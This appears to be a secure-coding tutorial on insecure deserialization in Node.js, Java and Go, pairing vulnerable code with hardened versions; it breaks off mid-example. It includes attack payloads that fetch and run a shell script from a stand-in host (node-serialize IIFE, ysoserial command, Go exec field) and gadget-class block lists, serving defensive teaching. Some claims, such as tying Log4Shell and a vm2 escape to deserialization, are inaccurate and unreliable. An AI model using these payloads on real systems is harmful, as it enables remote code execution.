Using `node-serialize`'s `unserialize()` on untrusted data is extremely dangerous and leads to Remote Code Execution (RCE). This vulnerability was exploited extensively after CVE-2017-5941, and similar patterns remain common in Node.js applications today.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());

app.get('/dashboard', (req, res) => {
  // DANGEROUS: Deserializing untrusted cookie data
  const sessionCookie = req.cookies.session;

  if (sessionCookie) {
    // This directly executes any code embedded in the serialized data
    const sessionData = serialize.unserialize(
      Buffer.from(sessionCookie, 'base64').toString()
    );

    res.json({
      welcome: `Hello, ${sessionData.username}`,
      role: sessionData.role
    });
  } else {
    res.status(401).json({ error: 'Not authenticated' });
  }
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized object with IIFE that spawns reverse shell
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash')}()"}

// Base64 encoded for cookie:
// eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIGh0dHBzOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgYmFzaCcpfSgpIn0=
```

**Why This Is Dangerous**:
- `node-serialize` evaluates JavaScript code during deserialization when it encounters `_$$ND_FUNC$$_` prefix
- The IIFE `()` at the end causes immediate code execution upon deserialization
- Attacker gains full access to Node.js runtime including `child_process`, `fs`, and network modules
- No user interaction required - just visiting a page with the malicious cookie triggers RCE

**SECURE VERSION**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const Ajv = require('ajv');
const crypto = require('crypto');

const app = express();
app.use(cookieParser());

// Define strict schema for session data
const ajv = new Ajv({ allErrors: true });
const sessionSchema = {
  type: 'object',
  properties: {
    username: { type: 'string', maxLength: 50, pattern: '^[a-zA-Z0-9_]+$' },
    role: { type: 'string', enum: ['user', 'admin', 'moderator'] },
    createdAt: { type: 'integer' }
  },
  required: ['username', 'role', 'createdAt'],
  additionalProperties: false
};
const validateSession = ajv.compile(sessionSchema);

const SECRET_KEY = process.env.SESSION_SECRET || crypto.randomBytes(32);

function verifyAndParseSession(signedData) {
  const parts = signedData.split('.');
  if (parts.length !== 2) {
    throw new Error('Invalid session format');
  }

  const [payload, signature] = parts;

  // Verify HMAC signature first
  const expectedSignature = crypto
    .createHmac('sha256', SECRET_KEY)
    .update(payload)
    .digest('hex');

  if (!crypto.timingSafeEqual(
    Buffer.from(signature, 'hex'),
    Buffer.from(expectedSignature, 'hex')
  )) {
    throw new Error('Invalid signature');
  }

  // SAFE: Using JSON.parse instead of unserialize
  const sessionData = JSON.parse(
    Buffer.from(payload, 'base64').toString('utf8')
  );

  // Validate against schema
  if (!validateSession(sessionData)) {
    throw new Error('Session data validation failed');
  }

  return sessionData;
}

app.get('/dashboard', (req, res) => {
  try {
    const sessionCookie = req.cookies.session;

    if (!sessionCookie) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    const sessionData = verifyAndParseSession(sessionCookie);

    res.json({
      welcome: `Hello, ${sessionData.username}`,
      role: sessionData.role
    });
  } catch (error) {
    console.error('Session verification failed:', error.message);
    res.status(401).json({ error: 'Invalid session' });
  }
});

app.listen(3000);
```

**Key Security Controls**:
- **JSON.parse() instead of unserialize()**: Native JSON parsing cannot execute code - it only deserializes data structures
- **HMAC signature verification**: Ensures session data hasn't been tampered with using cryptographic signing
- **Schema validation with AJV**: Enforces strict structure, types, and allowed values for deserialized data
- **Timing-safe comparison**: Prevents timing attacks when comparing signatures
- **No code execution paths**: JSON cannot contain executable functions

Handling complex objects and external API data requires a defense-in-depth approach with multiple validation layers. Never trust serialized data to contain methods - always reconstruct objects from validated primitives.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const Ajv = require('ajv');
const addFormats = require('ajv-formats');
const crypto = require('crypto');
const winston = require('winston');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json({ limit: '10kb' })); // Limit payload size

// Configure secure logging
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security.log' })
  ]
});

// Rate limiting for API endpoints
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests' }
});

// Schema validator with formats
const ajv = new Ajv({ 
  allErrors: true, 
  removeAdditional: true,
  useDefaults: true,
  coerceTypes: false
});
addFormats(ajv);

// Define schemas for external API data
const externalUserSchema = {
  type: 'object',
  properties: {
    id: { type: 'string', format: 'uuid' },
    email: { type: 'string', format: 'email', maxLength: 254 },
    profile: {
      type: 'object',
      properties: {
        firstName: { type: 'string', maxLength: 100, pattern: '^[\\p{L}\\s-]+$' },
        lastName: { type: 'string', maxLength: 100, pattern: '^[\\p{L}\\s-]+$' },
        avatar: { type: 'string', format: 'uri', maxLength: 2048 }
      },
      additionalProperties: false
    },
    permissions: {
      type: 'array',
      items: { type: 'string', enum: ['read', 'write', 'delete', 'admin'] },
      maxItems: 10
    },
    metadata: {
      type: 'object',
      properties: {
        createdAt: { type: 'string', format: 'date-time' },
        lastLogin: { type: 'string', format: 'date-time' }
      },
      additionalProperties: false
    }
  },
  required: ['id', 'email'],
  additionalProperties: false
};

const validateExternalUser = ajv.compile(externalUserSchema);

// Immutable User class - methods are defined here, not deserialized
class User {
  constructor(data) {
    // Freeze all properties to prevent prototype pollution
    this.id = String(data.id);
    this.email = String(data.email).toLowerCase();
    this.profile = Object.freeze({
      firstName: data.profile?.firstName || '',
      lastName: data.profile?.lastName || '',
      avatar: data.profile?.avatar || null
    });
    this.permissions = Object.freeze([...(data.permissions || ['read'])]);
    this.metadata = Object.freeze({
      createdAt: new Date(data.metadata?.createdAt || Date.now()),
      lastLogin: new Date(data.metadata?.lastLogin || Date.now())
    });
    Object.freeze(this);
  }

  // Methods are defined in code, never deserialized
  hasPermission(permission) {
    return this.permissions.includes(permission);
  }

  getFullName() {
    return `${this.profile.firstName} ${this.profile.lastName}`.trim();
  }

  toJSON() {
    return {
      id: this.id,
      email: this.email,
      profile: this.profile,
      permissions: this.permissions
    };
  }
}

// Safe deserialization pipeline
class SafeDeserializer {
  static BLOCKED_KEYS = ['__proto__', 'constructor', 'prototype'];
  static MAX_DEPTH = 10;
  static MAX_SIZE = 1024 * 100; // 100KB

  static sanitizeObject(obj, depth = 0) {
    if (depth > this.MAX_DEPTH) {
      throw new Error('Maximum object depth exceeded');
    }

    if (obj === null || typeof obj !== 'object') {
      return obj;
    }

    if (Array.isArray(obj)) {
      return obj.map(item => this.sanitizeObject(item, depth + 1));
    }

    const sanitized = {};
    for (const [key, value] of Object.entries(obj)) {
      // Block prototype pollution attempts
      if (this.BLOCKED_KEYS.includes(key)) {
        logger.warn('Blocked prototype pollution attempt', { key });
        continue;
      }

      // Block function-like strings (node-serialize pattern)
      if (typeof value === 'string' && 
          (value.includes('_$$ND_FUNC$$_') || 
           value.includes('function') ||
           value.includes('=>'))) {
        logger.warn('Blocked potential code injection', { key });
        continue;
      }

      sanitized[key] = this.sanitizeObject(value, depth + 1);
    }

    return sanitized;
  }

  static parse(jsonString, schema, sourceIdentifier) {
    // Size check
    if (Buffer.byteLength(jsonString, 'utf8') > this.MAX_SIZE) {
      throw new Error('Payload exceeds maximum size');
    }

    // Parse with native JSON (safe)
    let rawData;
    try {
      rawData = JSON.parse(jsonString);
    } catch (e) {
      logger.error('JSON parse failed', { source: sourceIdentifier, error: e.message });
      throw new Error('Invalid JSON format');
    }

    // Sanitize for prototype pollution
    const sanitized = this.sanitizeObject(rawData);

    // Validate against schema
    const validate = ajv.compile(schema);
    if (!validate(sanitized)) {
      logger.error('Schema validation failed', {
        source: sourceIdentifier,
        errors: validate.errors
      });
      throw new Error('Data validation failed');
    }

    return sanitized;
  }
}

// API endpoint receiving external data
app.post('/api/sync-user', apiLimiter, async (req, res) => {
  const requestId = crypto.randomUUID();

  try {
    // Log incoming request (without sensitive data)
    logger.info('External user sync request', {
      requestId,
      ip: req.ip,
      contentLength: req.get('content-length')
    });

    // Safely deserialize and validate
    const validatedData = SafeDeserializer.parse(
      JSON.stringify(req.body),
      externalUserSchema,
      `api-sync-${requestId}`
    );

    // Reconstruct object with our class (methods are safe)
    const user = new User(validatedData);

    logger.info('User sync successful', {
      requestId,
      userId: user.id
    });

    res.json({
      success: true,
      user: user.toJSON()
    });

  } catch (error) {
    logger.error('User sync failed', {
      requestId,
      error: error.message
    });

    res.status(400).json({
      error: 'Invalid user data',
      requestId
    });
  }
});

// Webhook handler for external services
app.post('/webhook/partner', apiLimiter, async (req, res) => {
  const signature = req.get('X-Webhook-Signature');
  const rawBody = JSON.stringify(req.body);

  // Verify webhook signature
  const expectedSig = crypto
    .createHmac('sha256', process.env.WEBHOOK_SECRET)
    .update(rawBody)
    .digest('hex');

  if (!signature || !crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expectedSig)
  )) {
    logger.warn('Invalid webhook signature', { ip: req.ip });
    return res.status(401).json({ error: 'Invalid signature' });
  }

  // Process with safe deserialization
  try {
    const data = SafeDeserializer.parse(
      rawBody,
      externalUserSchema,
      'webhook-partner'
    );

    res.json({ received: true });
  } catch (error) {
    res.status(400).json({ error: 'Invalid payload' });
  }
});

app.listen(3000);
```

**Defense in Depth Layers**:

1. **Payload Size Limits**: Prevent denial of service via large payloads
```javascript
app.use(express.json({ limit: '10kb' }));
if (Buffer.byteLength(jsonString, 'utf8') > MAX_SIZE) throw new Error('Too large');
```

2. **Prototype Pollution Prevention**: Block dangerous object keys
```javascript
const BLOCKED_KEYS = ['__proto__', 'constructor', 'prototype'];
if (BLOCKED_KEYS.includes(key)) continue;
```

3. **Code Injection Detection**: Block serialization library patterns
```javascript
if (value.includes('_$$ND_FUNC$$_') || value.includes('function')) continue;
```

**Additional Protections**:
- **Immutable objects**: Using `Object.freeze()` prevents post-deserialization modifications
- **Signature verification**: Cryptographically verify data from external sources hasn't been tampered with
- **Structured logging**: Track all deserialization attempts with request IDs for incident response
- **Rate limiting**: Prevent attackers from brute-forcing serialization vulnerabilities
- **Method reconstruction**: Never deserialize methods - define them in your class, reconstruct objects from validated primitives
- **Depth limiting**: Prevent stack overflow via deeply nested objects

Using Java's native `ObjectInputStream` to deserialize untrusted data is extremely dangerous and has led to some of the most devastating vulnerabilities in software history, including Log4Shell. When you deserialize data, you're essentially allowing the sender to execute code on your system.

**VULNERABLE CODE**:

```java
import java.io.*;
import java.net.*;
import java.util.Base64;

public class UserDataReceiver {

    public Object receiveUserData(Socket clientSocket) throws Exception {
        // VULNERABLE: Deserializing untrusted data from network
        InputStream inputStream = clientSocket.getInputStream();
        ObjectInputStream ois = new ObjectInputStream(inputStream);

        // This line can execute arbitrary code!
        Object userObject = ois.readObject();

        return userObject;
    }

    public Object decodeUserData(String base64Data) throws Exception {
        // VULNERABLE: Deserializing Base64-encoded user input
        byte[] data = Base64.getDecoder().decode(base64Data);
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);

        // Attacker controls this object completely
        return ois.readObject();
    }
}
```

**Attack Payload** (using ysoserial):
```bash
# Generate malicious serialized object using ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' | base64

# The resulting base64 string, when deserialized, executes the curl command
# rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QA...
```

**Why This Is Dangerous**:
- Java deserialization calls `readObject()` methods on attacker-controlled classes
- Gadget chains in common libraries (Commons Collections, Spring, etc.) allow arbitrary code execution
- The malicious code executes BEFORE your code can validate the object
- No amount of post-deserialization validation can prevent the attack

**SECURE VERSION**:

```java
import java.io.*;
import java.util.*;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.JsonNode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecureUserDataReceiver {
    private static final Logger logger = LoggerFactory.getLogger(SecureUserDataReceiver.class);
    private final ObjectMapper objectMapper;

    public SecureUserDataReceiver() {
        this.objectMapper = new ObjectMapper();
        // Disable dangerous features
        this.objectMapper.configure(
            com.fasterxml.jackson.databind.DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, 
            true
        );
    }

    public UserData receiveUserData(InputStream inputStream) {
        try {
            // SECURE: Use JSON instead of Java serialization
            // Parse to specific, known type - not Object
            UserData userData = objectMapper.readValue(inputStream, UserData.class);

            // Additional validation after parsing
            if (!isValidUserData(userData)) {
                logger.warn("Received invalid user data structure");
                throw new SecurityException("Invalid user data");
            }

            return userData;
        } catch (Exception e) {
            logger.error("Failed to parse user data: {}", e.getMessage());
            throw new SecurityException("Data parsing failed");
        }
    }

    private boolean isValidUserData(UserData data) {
        return data != null 
            && data.getUsername() != null 
            && data.getUsername().matches("^[a-zA-Z0-9_]{3,50}$");
    }
}

// Immutable data class with validation
public final class UserData {
    private final String username;
    private final String email;

    public UserData(String username, String email) {
        this.username = Objects.requireNonNull(username);
        this.email = Objects.requireNonNull(email);
    }

    public String getUsername() { return username; }
    public String getEmail() { return email; }
}
```

**Key Security Controls**:
- **Use data formats, not code formats**: JSON, Protocol Buffers, or XML don't allow code execution
- **Deserialize to specific types**: Never deserialize to `Object` or generic types
- **Input validation after parsing**: Validate all fields match expected patterns

If you have unavoidable legacy requirements, there are defense-in-depth approaches, but understand that Java serialization remains inherently risky. The 2022-2024 period saw continued exploitation even in "protected" systems. Here's a production-hardened approach:

**PRODUCTION PATTERN**:

```java
import java.io.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class HardenedObjectInputStream extends ObjectInputStream {
    private static final Logger logger = LoggerFactory.getLogger(HardenedObjectInputStream.class);
    private static final Logger securityAudit = LoggerFactory.getLogger("SECURITY_AUDIT");

    // LAYER 1: Strict allowlist of permitted classes
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.myapp.dto.UserData",
        "com.myapp.dto.SessionInfo",
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.util.ArrayList",
        "java.util.HashMap"
    );

    // LAYER 2: Explicit blocklist of known gadget classes
    private static final Set<String> BLOCKED_CLASSES = Set.of(
        "org.apache.commons.collections.functors.InvokerTransformer",
        "org.apache.commons.collections4.functors.InvokerTransformer",
        "org.springframework.beans.factory.ObjectFactory",
        "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "java.lang.Runtime",
        "java.lang.ProcessBuilder",
        "javax.naming.InitialContext",
        "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    );

    // LAYER 3: Track deserialization depth to prevent bombs
    private static final int MAX_DEPTH = 20;
    private static final int MAX_OBJECTS = 1000;
    private int currentDepth = 0;
    private int objectCount = 0;

    // LAYER 4: Per-session tracking for anomaly detection
    private static final ConcurrentHashMap<String, Integer> sessionAttempts = 
        new ConcurrentHashMap<>();
    private final String sessionId;

    public HardenedObjectInputStream(InputStream in, String sessionId) throws IOException {
        super(in);
        this.sessionId = sessionId;

        // Rate limiting check
        int attempts = sessionAttempts.merge(sessionId, 1, Integer::sum);
        if (attempts > 100) {
            securityAudit.error("SECURITY: Excessive deserialization attempts from session {}", 
                sessionId);
            throw new SecurityException("Rate limit exceeded");
        }
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
            throws IOException, ClassNotFoundException {

        String className = desc.getName();

        // SECURITY CHECK 1: Block known dangerous classes
        if (BLOCKED_CLASSES.contains(className)) {
            securityAudit.error(
                "SECURITY ALERT: Blocked gadget class {} from session {}",
                className, sessionId
            );
            throw new InvalidClassException(className, "Class is blocked for security");
        }

        // SECURITY CHECK 2: Only allow explicitly permitted classes
        if (!ALLOWED_CLASSES.contains(className)) {
            securityAudit.warn(
                "SECURITY: Rejected unlisted class {} from session {}",
                className, sessionId
            );
            throw new InvalidClassException(className, "Class not in allowlist");
        }

        // SECURITY CHECK 3: Depth limiting
        currentDepth++;
        if (currentDepth > MAX_DEPTH) {
            securityAudit.error(
                "SECURITY: Deserialization depth exceeded for session {}",
                sessionId
            );
            throw new SecurityException("Deserialization depth limit exceeded");
        }

        // SECURITY CHECK 4: Object count limiting
        objectCount++;
        if (objectCount > MAX_OBJECTS) {
            securityAudit.error(
                "SECURITY: Object count exceeded for session {}",
                sessionId
            );
            throw new SecurityException("Too many objects in stream");
        }

        logger.debug("Deserializing allowed class: {}", className);
        return super.resolveClass(desc);
    }

    @Override
    protected ObjectStreamClass readClassDescriptor() 
            throws IOException, ClassNotFoundException {
        ObjectStreamClass desc = super.readClassDescriptor();

        // Additional serialVersionUID validation for known classes
        // Prevents some version-mismatch attacks
        if ("com.myapp.dto.UserData".equals(desc.getName())) {
            if (desc.getSerialVersionUID() != UserData.serialVersionUID) {
                throw new InvalidClassException("serialVersionUID mismatch");
            }
        }

        return desc;
    }
}

// Secure deserialization service with additional controls
public class SecureDeserializationService {
    private static final Logger logger = LoggerFactory.getLogger(SecureDeserializationService.class);
    private static final int MAX_PAYLOAD_SIZE = 10 * 1024; // 10KB max

    public <T> T deserialize(byte[] data, Class<T> expectedType, String sessionId) {
        // LAYER 5: Size limit before any processing
        if (data == null || data.length > MAX_PAYLOAD_SIZE) {
            logger.warn("Payload size violation: {} bytes from session {}",
                data != null ? data.length : 0, sessionId);
            throw new SecurityException("Payload size limit exceeded");
        }

        // LAYER 6: Magic bytes validation
        if (data.length < 2 || data[0] != (byte) 0xAC || data[1] != (byte) 0xED) {
            throw new SecurityException("Invalid serialization header");
        }

        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
             HardenedObjectInputStream ois = new HardenedObjectInputStream(bais, sessionId)) {

            Object result = ois.readObject();

            // LAYER 7: Type verification after deserialization
            if (!expectedType.isInstance(result)) {
                logger.error("Type mismatch: expected {} but got {}",
                    expectedType.getName(), 
                    result != null ? result.getClass().getName() : "null");
                throw new SecurityException("Unexpected object type");
            }

            return expectedType.cast(result);

        } catch (IOException | ClassNotFoundException e) {
            logger.error("Deserialization failed for session {}: {}", 
                sessionId, e.getMessage());
            throw new SecurityException("Deserialization failed", e);
        }
    }
}
```

**Defense in Depth Layers**:

1. **Class Allowlisting (Primary Defense)**:
```java
// Only these specific classes can be deserialized
private static final Set<String> ALLOWED_CLASSES = Set.of(
    "com.myapp.dto.UserData",
    "java.lang.String"
);
```

2. **Known Gadget Blocking (Secondary Defense)**:
```java
// Block classes used in known exploit chains
if (BLOCKED_CLASSES.contains(className)) {
    throw new InvalidClassException(className, "Blocked gadget class");
}
```

3. **Resource Limits (DoS Prevention)**:
```java
// Prevent billion-laughs style attacks
if (currentDepth > MAX_DEPTH || objectCount > MAX_OBJECTS) {
    throw new SecurityException("Resource limit exceeded");
}
```

**Additional Protections**:
- **JVM Security Manager** (deprecated but still functional): Restrict what deserialized code can do
- **Agent-based protection**: Use tools like NotSoSerial or contrast-rO0 as runtime guards
- **Network segmentation**: Isolate services that must deserialize in restricted network zones
- **Serialization filters (JEP 290)**: Use JVM-level ObjectInputFilter for global protection:

```java
// JEP 290 filter (Java 9+, backported to Java 8u121+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;java.lang.*;java.util.*;!*"
);
ObjectInputFilter.Config.setSerialFilter(filter);
```

- **Monitoring and alerting**: Log all deserialization attempts for security analysis
- **Consider migration path**: Plan to replace Java serialization with JSON/Protobuf in future releases

Deserialization vulnerabilities are extremely dangerous - they led to the 2022 vm2 sandbox escape (CVE-2022-36067) affecting millions of applications. In Go, while JSON itself is safer than formats like gob or YAML, improper handling can still lead to serious issues.

**VULNERABLE CODE**:

```go
package main

import (
	"encoding/gob"
	"encoding/json"
	"io"
	"net/http"
	"os/exec"
)

// DANGEROUS: Accepts arbitrary type information
type UserConfig struct {
	Name    string      `json:"name"`
	Command string      `json:"command"`
	Data    interface{} `json:"data"` // Accepts any type!
}

// VULNERABLE: Deserializes gob from untrusted source
func handleGobUpload(w http.ResponseWriter, r *http.Request) {
	var config UserConfig
	decoder := gob.NewDecoder(r.Body)
	if err := decoder.Decode(&config); err != nil {
		http.Error(w, "Decode error", 500)
		return
	}
	// CRITICAL: Executes command from deserialized data
	if config.Command != "" {
		cmd := exec.Command("sh", "-c", config.Command)
		cmd.Run()
	}
	w.Write([]byte("Config processed"))
}

// VULNERABLE: No validation, accepts any structure
func handleJSONConfig(w http.ResponseWriter, r *http.Request) {
	var rawData map[string]interface{}
	body, _ := io.ReadAll(r.Body)
	json.Unmarshal(body, &rawData) // No error checking

	// DANGEROUS: Type assertion without validation
	if cmd, ok := rawData["exec"].(string); ok {
		exec.Command("sh", "-c", cmd).Run()
	}
}
```

**Attack Payload**:
```json
{
  "name": "innocent_config",
  "exec": "curl https://attacker.com/shell.sh | bash",
  "data": {"__proto__": {"polluted": true}}
}
```

**Why This Is Dangerous**:
- Using `interface{}` accepts any type, allowing unexpected data structures
- Gob encoding from untrusted sources can instantiate arbitrary types
- No validation before executing commands from deserialized data
- Missing error handling masks attack indicators
- No allowlist of expected fields or values

**SECURE VERSION**:

```go
package main

import (
	"encoding/json"
	"errors"
	"io"
	"log"
	"net/http"
	"regexp"
)

// SECURE: Strongly typed struct with validated fields
type SafeUserConfig struct {
	Name     string            `json:"name"`
	Theme    string            `json:"theme"`
	Settings map[string]string `json:"settings"`
}

// Validation constants
var (
	validNamePattern  = regexp.MustCompile(`^[a-zA-Z0-9_-]{1,50}$`)
	allowedThemes     = map[string]bool{"light": true, "dark": true, "system": true}
	allowedSettings   = map[string]bool{"notifications": true, "language": true, "timezone": true}
	maxRequestSize    = int64(1024 * 10) // 10KB max
)

func (c *SafeUserConfig) Validate() error {
	if !validNamePattern.MatchString(c.Name) {
		return errors.New("invalid name format")
	}
	if !allowedThemes[c.Theme] {
		return errors.New("invalid theme")
	}
	for key := range c.Settings {
		if !allowedSettings[key] {
			return errors.New("invalid setting key: " + key)
		}
	}
	return nil
}

func handleSafeConfig(w http.ResponseWriter, r *http.Request) {
	// DEFENSE 1: Limit request body size
	r.Body = http.MaxBytesReader(w, r.Body, maxRequestSize)

	// DEFENSE 2: Only accept JSON content type
	if r.Header.Get("Content-Type") != "application/json" {
		http.Error(w, "Invalid content type", http.StatusUnsupportedMediaType)
		return
	}

	// DEFENSE 3: Use strict decoder
	var config SafeUserConfig
	decoder := json.NewDecoder(r.Body)
	decoder.DisallowUnknownFields() // Reject unexpected fields

	if err := decoder.Decode(&config); err != nil {
		log.Printf("JSON decode error from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Invalid JSON format", http.StatusBadRequest)
		return
	}

	// DEFENSE 4: Validate all fields
	if err := config.Validate(); err != nil {
		log.Printf("Validation failed from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Validation failed", http.StatusBadRequest)
		return
	}

	log.Printf("Valid config received from %s: %s", r.RemoteAddr, config.Name)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "success"})
}
```

**Key Security Controls**:
- **Strongly typed structs**: No `interface{}` prevents arbitrary type injection
- **DisallowUnknownFields()**: Rejects JSON with unexpected properties
- **MaxBytesReader**: Prevents denial of service via large payloads
- **Allowlist validation**: Only permitted values accepted for each field

Polymorphic deserialization is one of the most dangerous patterns - it's exactly what enabled the Java gadget chain attacks. In Go, you can handle this safely using a type discriminator with an explicit factory pattern.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"time"
)

// Versioned envelope for all messages
type MessageEnvelope struct {
	Version   string          `json:"version"`
	Type      string          `json:"type"`
	Timestamp int64           `json:"timestamp"`
	Checksum  string          `json:"checksum"`
	Payload   json.RawMessage `json:"payload"` // Defer parsing
}

// Concrete message types - no interface{}
type NotificationPayload struct {
	Title   string `json:"title"`
	Message string `json:"message"`
	Level   string `json:"level"`
}

type ConfigUpdatePayload struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

type AuditLogPayload struct {
	Action   string `json:"action"`
	Resource string `json:"resource"`
	UserID   string `json:"user_id"`
}

// SECURE: Type registry with factory functions
type PayloadValidator interface {
	Validate() error
}

type PayloadFactory func(json.RawMessage) (PayloadValidator, error)

var (
	payloadRegistry = map[string]PayloadFactory{
		"notification":  parseNotification,
		"config_update": parseConfigUpdate,
		"audit_log":     parseAuditLog,
	}
	registryMutex sync.RWMutex

	// Rate limiting per IP
	rateLimiter = make(map[string]*RateLimitEntry)
	rateMutex   sync.Mutex
)

type RateLimitEntry struct {
	Count     int
	ResetTime time.Time
}

func parseNotification(raw json.RawMessage) (PayloadValidator, error) {
	var p NotificationPayload
	if err := json.Unmarshal(raw, &p); err != nil {
		return nil, err
	}
	return &p, nil
}

func (p *NotificationPayload) Validate() error {
	if len(p.Title) == 0 || len(p.Title) > 100 {
		return errors.New("invalid title length")
	}
	if len(p.Message) > 1000 {
		return errors.New("message too long")
	}
	allowedLevels := map[string]bool{"info": true, "warn": true, "error": true}
	if !allowedLevels[p.Level] {
		return errors.New("invalid notification level")
	}
	return nil
}

func parseConfigUpdate(raw json.RawMessage) (PayloadValidator, error) {
	var p ConfigUpdatePayload
	if err := json.Unmarshal(raw, &p); err != nil {
		return nil, err
	}
	return &p, nil
}

func (p *ConfigUpdatePayload) Validate() error {
	allowedKeys := map[string]bool{"theme": true, "language": true, "timezone": true}
	if !allowedKeys[p.Key] {
		return fmt.Errorf("config key not allowed: %s", p.Key)
	}
	if len(p.Value) > 100 {
		return errors.New("config value too long")
	}
	return nil
}

func parseAuditLog(raw json.RawMessage) (PayloadValidator, error) {
	var p AuditLogPayload
	if err := json.Unmarshal(raw, &p); err != nil {
		return nil, err
	}
	return &p, nil
}

func (p *AuditLogPayload) Validate() error {
	allowedActions := map[string]bool{"read": true, "write": true, "delete": true}
	if !allowedActions[p.Action] {
		return errors.New("invalid audit action")
	}
	return nil
}

// Integrity verification
func verifyChecksum(envelope *MessageEnvelope) bool {
	hash := sha256.Sum256(envelope.Payload)
	expected := hex.EncodeToString(hash[:])
	return envelope.Checksum == expected
}

// Rate limiting check
func checkRateLimit(ip string) bool {
	rateMutex.Lock()
	defer rateMutex.Unlock()

	now := time.Now()
	entry, exists := rateLimiter[ip]

	if !exists || now.After(entry.ResetTime) {
		rateLimiter[ip] = &RateLimitEntry{Count: 1, ResetTime: now.Add(time.Minute)}
		return true
	}

	if entry.Count >= 100 {
		return false
	}
	entry.Count++
	return true
}

func handlePolymorphicMessage(w http.ResponseWriter, r *http.Request) {
	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
	defer cancel()

	// DEFENSE 1: Rate limiting
	if !checkRateLimit(r.RemoteAddr) {
		log.Printf("SECURITY: Rate limit exceeded for %s", r.RemoteAddr)
		http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
		return
	}

	// DEFENSE 2: Size limit
	r.Body = http.MaxBytesReader(w, r.Body, 64*1024) // 64KB max

	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("SECURITY: Body read error from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Request too large", http.StatusRequestEntityTooLarge)
		return
	}

	// DEFENSE 3: Parse envelope only (defer payload parsing)
	var envelope MessageEnvelope
	if err := json.Unmarshal(body, &envelope); err != nil {
		log.Printf("SECURITY: Invalid envelope from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Invalid message format", http.StatusBadRequest)
		return
	}

	// DEFENSE 4: Version check
	if envelope.Version != "1.0" {
		log.Printf("SECURITY: Invalid version from %s: %s", r.RemoteAddr, envelope.Version)
		http.Error(w, "Unsupported version", http.StatusBadRequest)
		return
	}

	// DEFENSE 5: Timestamp validation (prevent replay attacks)
	msgTime := time.Unix(envelope.Timestamp, 0)
	if time.Since(msgTime) > 5*time.Minute || msgTime.After(time.Now().Add(time.Minute)) {
		log.Printf("SECURITY: Invalid timestamp from %s", r.RemoteAddr)
		http.Error(w, "Invalid timestamp", http.StatusBadRequest)
		return
	}

	// DEFENSE 6: Checksum verification
	if !verifyChecksum(&envelope) {
		log.Printf("SECURITY: Checksum mismatch from %s", r.RemoteAddr)
		http.Error(w, "Integrity check failed", http.StatusBadRequest)
		return
	}

	// DEFENSE 7: Allowlist type lookup (no reflection)
	registryMutex.RLock()
	factory, exists := payloadRegistry[envelope.Type]
	registryMutex.RUnlock()

	if !exists {
		log.Printf("SECURITY: Unknown type from %s: %s", r.RemoteAddr, envelope.Type)
		http.Error(w, "Unknown message type", http.StatusBadRequest)
		return
	}

	// DEFENSE 8: Type-specific parsing with timeout
	select {
	case <-ctx.Done():
		http.Error(w, "Request timeout", http.StatusRequestTimeout)
		return
	default:
		payload, err := factory(envelope.Payload)
		if err != nil {
			log.Printf("SECURITY: Payload parse error from %s: %v", r.RemoteAddr, err)
			http.Error(w, "Invalid payload", http.StatusBadRequest)
			return
		}

		// DEFENSE 9: Validate parsed payload
		if err := payload.Validate(); err != nil {
			log.Printf("SECURITY: Validation failed from %s: %v", r.RemoteAddr, err)
			http.Error(w, "Validation failed", http.StatusBadRequest)
			return
		}

		// Audit log successful processing
		log.Printf("AUDIT: Processed %s message from %s", envelope.Type, r.RemoteAddr)

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{
			"status": "processed",
			"type":   envelope.Type,
		})
	}
}

func main() {
	http.HandleFunc("/api/message", handlePolymorphicMessage)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

**Defense in Depth Layers**:

1. **Envelope Pattern with Deferred Parsing**:
```go
